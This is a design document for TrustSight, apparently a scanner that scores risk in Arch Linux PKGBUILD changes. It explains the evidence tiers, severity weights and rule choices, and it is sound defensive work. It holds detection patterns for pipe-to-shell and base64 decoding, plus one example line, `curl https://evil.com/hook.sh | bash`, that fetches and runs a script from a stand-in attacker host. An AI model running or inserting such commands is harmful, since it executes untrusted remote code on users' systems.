<!-- description: Why the score is a sum of evidence weighted by how much information each signal carries, why verification is declared rather than scored, and how weights are set. -->

# Scoring Philosophy

The scoring system is designed around a single question: *how much new information does each signal carry?* Signals that fire on every package carry zero information. Signals that rarely fire and correlate with known threats carry the most.

## Evidence tiers (A/B/C/D)

Signals are grouped into four tiers:

| Tier | Basis | Availability | Example |
|------|-------|-------------|---------|
| **A : Structural** | Static analysis of the PKGBUILD | Always, no corpus needed | `curl \| bash`, base64 decode, variable source URL |
| **B : Priors** | Static source-host classification | Always, no corpus needed | `trusted_forge`, `official`, `raw_hosting`, `unknown`, `homograph_attack` |
| **C : History/Novelty** | Observation counts across corpus | Requires warm corpus (≥50 observations for full weight) | URL first seen globally, first seen in this package, new maintainer |
| **D : Verification** | Declared integrity metadata | Always | Checksum declared, PGP key declared, GPG signature source |

Structural signals (A) are always weighted; they don't depend on external data. Context signals (B) are configured static lists and a homograph check, not corpus-derived reputation. History signals (C) require observation; they are definitionally meaningless on run one. Verification signals (D) are reported at weight 0: they are claims the recipe makes, not facts the tool confirms.

## Why verification is declared, never scored

The naive design (described in the Dropbox paper that inspired the tool) scored
checksum-missing packages *higher*. This meant:

- A package **with** checksums scored **higher** than one without.
- A package with no checksums and no other signals scored **0**.

That is inverted, and TrustSight's first answer was to make verification
subtractive. That answer was also wrong, for a different reason.

Everything TrustSight sees is attacker-declared. Adding `validpgpkeys=(...)`,
pinning a `#commit=`, or routing through github.com costs an attacker nothing,
and TrustSight never fetches, so it never confirms that a declared key signs
anything or that a pinned commit contains what it claims. A signal an attacker
can assert for free must not be able to lower a score: the only reliable effect
of such a mechanism is buying points back for whoever bothers to read the rules.

So declared verification is emitted as **weight-0 findings in the `P`
namespace** and reported to the reader, who can check the claims in ways the
tool cannot:

| Signal | Finding | Weight |
|--------|---------|--------|
| checksums declared | `P001` | 0 |
| `validpgpkeys` declared | `P002` | 0 |
| signature source declared | `P003` | 0 |

The original inversion is fixed at source rather than paid back: H001 does not
fire on a `SKIP` that is mandatory for a VCS source, structurally uncheckable
for a signature file, or covered by declared PGP keys. Stopping the false
positive was the right fix. See
[B10](../security.md#b10-positive-evidence-is-reported-never-credited).

## Severity weights

Each rule carries a severity weight, derived from its information value:

| Severity | Weight |
|----------|--------|
| CRITICAL | 40 |
| HIGH | 25 |
| MEDIUM | 15 |
| LOW | 5 |
| INFO | 0 |

FATAL rules are special: they set the score to 100 and contribute zero weight. If a FATAL rule fires, the score is 100 regardless of other signals.

## Pinning and source buckets

Pinning metadata is reported, not credited, for the same reason as verification:
a pin is a claim about a ref that TrustSight never resolves.

| Signal | Finding | Weight |
|--------|---------|--------|
| pinned to a commit | `P005` | 0 |
| pinned to a tag | `P006` | 0 |

`P006` is deliberately phrased as the weaker form. A tag can be repointed; a
commit hash cannot, which is why H033 exists.

Source bucket classification only ever adds:

| Bucket | Effect | Rationale |
|--------|--------|-----------|
| `trusted_forge` | 0 | GitHub, GitLab : neutral, reported as `P007` |
| `official` | 0 | Upstream official domains : neutral |
| `raw_hosting` | +15 | Configured raw-content host : requires scrutiny |
| `unknown` | +20 | Unrecognised domain : requires scrutiny |
| `homograph_attack` | +30 | Visually confusable domain : high risk |

These are static configured buckets, not corpus-frequency classes; there is no
`self_hosted` bucket.

## Why popularity/votes are never a positive signal

The threat model is inverted. Compromise targets the popular. A widely-used package with thousands of votes is *more* valuable as a compromise target, not less. The xz utils lesson: the most dangerous backdoor in recent history targeted a widely-trusted, widely-used library. Popularity is not safety.

## Why maintainer identity is a change-detection key, never a reputation credential

Same lesson. A change of maintainer is a flag for investigation; it means the package is under new control. It is not a negative score by itself. Maintainer identity is tracked as a change-detection signal, not a reputation credential.

## Why weights are derived from corpus frequency, not asserted

Every scored rule is validated against corpus frequency. A rule that fires on
most packages is not signalling anything useful. H003 is LOW because it makes
the narrow, diff-aware claim that a newly added plain-HTTP source lacks newly
declared checksum backing, not because it matches a broad source-array shape.

## Rule design decisions

### R001 and R002: why separate rules for curl and wget

Curl and wget are the two most common tools for fetching remote content in PKGBUILDs. Combining them into a single rule would make it harder to tune: a user who accepts wget pipe patterns but wants to block curl pipe patterns would have to disable the combined rule entirely. Separate rules per tool let users choose which network tools to allow.

Matched against resolved strings because the URL or flags might be in a variable. The pattern catches the pipe to a shell, not just the presence of curl or wget alone.

### R012 and R013: why FATAL instead of CRITICAL

FATAL rules (R012 prompt injection, R013 unicode bidi) are fundamentally different from CRITICAL rules. A CRITICAL rule like `curl | bash` fires on a specific command pattern that is almost always malicious. A FATAL rule fires on a pattern that, when present, indicates active manipulation of the reviewer's perception.

Prompt injection and unicode bidi overrides are attacks on the reviewer, not on the build process. They attempt to hide what the PKGBUILD does. When these fire, the score hard-stops at 100 because a package that tries to deceive the reviewer cannot be trusted regardless of other signals. The 0 weight means they contribute nothing to the additive score; the hard stop is their entire effect.

Low recall is acceptable for these rules. R012 has 17% recall on the benchmark corpus. It is a tripwire: when it fires, the package is almost certainly malicious. When it does not, nothing can be concluded.

### H001 and H002: why checksum rules are hard-coded

Checksum integrity is foundational to the entire scoring system. Every other signal is evaluated in the context of whether checksums are present or disabled. Allowing users to disable H001 or H002 through `rules.toml` would produce misleading results: a package with `sha256sums=('SKIP')` that otherwise looks clean would score 0, but the missing checksum is itself a risk.

These rules are hard-coded in `src/trustsight/analysis/structural.py` and cannot be disabled through configuration. H001 has automatic justification detection: if the diff contains a VCS source (`git+https://`, `.git`), a signature file (`.sig`, `.asc`), a `validpgpkeys` declaration, or a DKMS reference, the severity is downgraded from HIGH (weight 25) to INFO (weight 0). The justification checks whether the checksum skip is structurally explained, not whether it is safe.

### H004: why sudo detection is scoped to function_body

A naive `sudo` rule that matches anywhere in the PKGBUILD fires on comments, on text in `pkgdesc`, and on top-level variable assignments like `groups=('sudo')`. The `function_body` scope restricts matching to the build functions (`build()`, `package()`, `check()`), where a `sudo` command has real effect. Corpus fire-rate analysis is what settles it: unfiltered `sudo` matching is a census signal rather than a risk signal.

### C001, C002, C003: why code rules exist

Code rules (C-series) enforce structural invariants that cannot be expressed as a single regex match. C001 fires when a checksum changed without a source URL change and without a version bump: the checksum changed but nothing else did, which is anomalous. C002 is the same check but with a version bump present: normal during routine updates, recorded for audit only. C003 fires when source URLs changed without a version bump.

These rules are hard-coded because they depend on comparing multiple parsed fields (checksum state, source URL set, pkgver value). Writing them as TOML patterns would require embedding logic in regex, which is fragile and unreadable. The C-series namespace also prevents users from accidentally disabling structural invariants that the scoring model depends on.

### Why match_target has two values

Rules matched against `resolved` strings see the post-variable-expansion PKGBUILD. This catches patterns where the malicious command is hidden behind a variable: `curl $url | $shell` in the diff line becomes `curl https://evil.com/hook.sh | bash` after resolution.

Rules matched against `raw_line` strings see the literal PKGBUILD text. This catches patterns in the structure of the PKGBUILD itself: a `sha256sums=('SKIP')` declaration, a unicode bidi override character in a string literal, or a `.install` file reference.

The two-target design exists because PKGBUILDs encode meaning in both their text (structure, declarations) and their resolved values (commands, URLs). A pattern like `sudo` is meaningful in the raw text (where it can be seen and reviewed) but meaningless when resolved (sudo is not a variable). A pattern like `curl | bash` is meaningful only after resolution (where the actual URL and shell are known).
